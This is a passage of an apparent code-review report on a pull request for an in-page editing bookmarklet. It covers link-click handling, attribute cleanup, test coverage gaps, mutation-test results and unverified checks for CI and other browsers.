    The page still tells the user "Links in navigation stay safe by default. Hold Alt while
    clicking one…" (`src/components/try/TryExperience.tsx:138-139`). The acceptance, the copy and
    the code now disagree.

    Chromium test: save a headline edit, then plain-click. Three shapes:
    - a hero CTA `<div class="actions"><a class="btn">Get started</a>`;
    - `<p><a class="button">Book a call</a></p>`;
    - an inline link inside a content `<li>` ("Works with WordPress and Webflow").

    `fec764e` and `889041c` start editing each target. `e889e77` navigates to the link's `href`
    each time, so the page and the saved "EDITED" headline are gone. Anchor-styled CTAs are the
    most common button on marketing pages, and the page copy tells the persona they are editable.
    Scope of the `LI` rule (`:126`): a link inside a content `<li>` navigates, while the same link
    inside a `<p>` edits the paragraph.

    Fix: this is an operator decision. Either restore plain-click editing for non-navigation link
    targets, keeping the `nav` rule and the menu `li > a` shape, or update the acceptance line and
    the /try copy to say every link keeps working and Alt edits any link label. Add a test for
    whichever rule is chosen.

#### Minor

E2. **D2's block bound brings back link navigation during an edit for block-wrapped card
    links.** Shape: `<a class="card" style="display:block"><div class="card-body"><h3>…`, the
    usual Bootstrap card. Edit the title, type, then click the card padding. `889041c` stays on
    the page. `e889e77` navigates to the card `href`, and the edit is lost. The walk (`:439-440`)
    breaks at `div.card-body` before it reaches the link. This contradicts the research trap
    "Avoid … link navigation during edit" (`docs/research/s32-try-on-any-site.md:27`). To keep
    passing, the e2e fixture was reshaped: the `article` wrapper was removed and the `h3` moved
    directly into the anchor (`e2e/try-preview.spec.ts:230-260`). The plan's "wrapper padding"
    evidence therefore covers only the direct-child shape. Fix: while editing, also suppress a
    click whose `closest("a")` is the edited element's own `closest("a")`. That is exact, and it
    cannot reach a page-wide wrapper.

E3. **An Alt-hover outline can stick.** `onMouseOut` (`:408-411`) recomputes the candidate with
    the *current* `altKey`. If Alt is released before the pointer leaves a link, `candidateFrom`
    returns null (nav rule or `LI` rule) and `data-rcf-try-hover` is never restored. Chromium: the
    attribute was still present after `mouseout` without Alt. It is cosmetic, and Exit clears it.
    Fix: restore on `event.target.closest("[data-rcf-try-hover]")`.

E4. **A cloned body keeps a cloned edit's attributes.** In the D4 simulation with an edit open,
    `resume()` drops the cloned UI. However, the cloned `<p>` keeps `contenteditable=
    "plaintext-only"` and `data-rcf-try-editing`, and a hovered clone keeps `data-rcf-try-hover`.
    These nodes are not in `ownedAttributes`, so after Exit the host paragraph stays editable
    until reload. This was only simulated, as for D4. Fix: in `resume()`, strip those attributes
    from nodes it does not own.

E5. **The `LI` rule is untested, and the image-file test is timing-flaky.**
    - N1 dropped `candidate.tagName === "LI"` (`:126`): **0/29 jest and 0/5 Playwright went red**.
      The only shape that needs it is a no-`nav` mega-menu `<li><a/><div panel><p/></div></li>`,
      and no test has it.
    - `rcf-try.test.ts:424` ("replaces an image from a local raster file…") waits a fixed 25 ms.
      That wait now has to cover `FileReader` plus the new decode macrotask. On this host (load
      average about 600 from concurrent lanes) it failed **1 of 3** isolated runs on the clean
      tree. Use a polling `waitFor` instead. This also means some jest red counts below include
      that flake. See the note under the table.

E6. **No CI has run on `e889e77`.** `gh pr checks 27` lists only CodeRabbit (skipped: draft) and
    Vercel. PR #27 is **CONFLICTING** with `origin/main`: `300548a` (PR #25) landed after the
    merge, and `git merge-tree` reports a conflict in `docs/stories.md` only. GitHub therefore
    did not start the pull-request CI workflow. The last CI run is `889041c`. The plan's box
    "refresh its evidence" is ticked, but the 44-case strict contract, lint, type-check and full
    jest have not been run by CI on this commit. This is not a code defect. It is a precondition
    for merge: resolve the stories conflict, push, and see the 44-test E2E job green.

### Verification (run by the reviewer, Node 25.6.1)

- s32 jest (runtime, delivery, page, both e2e contracts): **5 suites, 48/48 passed** on the first
  run. Later runtime-only reruns hit the E5 flake: 1/29 red, the same test each time.
- `CI=true npx playwright test e2e/try-preview.spec.ts --retries=0`: **5/5 passed**. `--list`:
  44 total.
- `tsc --noEmit -p tsconfig.json`: exit 0. ESLint on the changed runtime, e2e and tests:
  0 errors, 1 warning (the unused `_` at `rcf-try.js:21`, already there before). Prettier
  `--check`: clean.
- Runtime gzip-9: **6,721 B ≤ 8,192 B** (macOS `gzip -9`; the plan's 6,662 B came from a
  different encoder).
- Full jest and the full 44-case disposable stack were **not** run locally (E6).
- Chromium probes: scratch Playwright scripts, runtime injected via `page.route`. The committed
  runtime was compared against `fec764e` and `889041c` for the card and CTA shapes.

### Neutralizations (all restored; `git diff --exit-code` clean after each; final tree clean)

| # | Neutralized | Jest red (29) | Playwright red (5) |
|---|---|---|---|
| N1 | `LI` clause dropped from `:126` | **0** | **0** (E5) |
| N2 | nav-link early return `:117` removed | 2 | 0 |
| N3 | `onlyEditableContentIsLink` check removed | 1 | 1 |
| N4 | Alt early return `:116` removed | 3 | 1 |
| N5 | block-container break `:440` removed | 2 | 0 |
| N6 | depth cap `< 4` removed | 2 | 0 |
| N7 | keydown `isComposing` guard removed | 2 | 0 |
| N8 | Space/Enter hand-insert for every text edit (D5 reverted) | 2 | 1 |
| N9 | `onPaste` back to `event.target === active.element` | 2 | 0 |
| N10 | `resume()` no longer removes stale UI | 2 | 0 |
| N11 | click listener on `document` instead of `window` (D6) | 2 | 0 |
| N12 | 5 MiB cap disabled | 1 | 1 |
| N13 | decode step skipped | 1 | 1 |
| N14 | beacon added in the decode `onload` | 1 | 1 |
| N15 | `boundedInteractiveAncestorContains` always false | 1 | 1 |

Jest counts were taken during the E5 flake window. At most one red per row can be the flake,
so every row with 2 or more jest red has a real jest guard. Rows with 1 jest red are proven by
their Playwright red. N1 is green on both runners, so the `LI` rule is unguarded.

### Not verified: human gestures needed

- **CI on this commit** (E6). Resolve the `docs/stories.md` conflict, push, and confirm the
  "E2E (Playwright)" job reports exactly 44 passed, 0 skipped and 0 flaky.
- **Real bookmarks bar, Firefox and Safari.** Only Chromium was driven. The runtime was injected,
  not dragged. On a real WordPress site and a Bootstrap site, a human should:
  - click a menu link (expect navigation);
  - Alt+click it (expect label editing; on macOS confirm Option+click does not download);
  - click a hero CTA anchor (E1: decide what should happen);
  - edit a card title and click the card padding (E2);
  - type with an IME in a button label.
- **Real Turbo Drive** (E4). Open an edit, click a nav link, press Back, rerun the bookmarklet,
  Exit, then check that no paragraph is left `contenteditable`.
- **Undo depth in Firefox/Safari.** Native undo was confirmed in Chromium only.
- **Multi-megabyte valid images.** Only the 5 MiB+1 rejection and a tiny PNG were exercised.

This delta resolves D1–D8 as requested. Every new guard bites except the `LI` clause. It adds one
major (E1): link labels now need Alt everywhere, which contradicts the story acceptance and the
/try copy and turns a plain click on a CTA anchor into lost preview work. The fix is a product
call and a small change either way. Resolve it, and E6, before the first public share.

Max severity: major
Ship allowed: yes
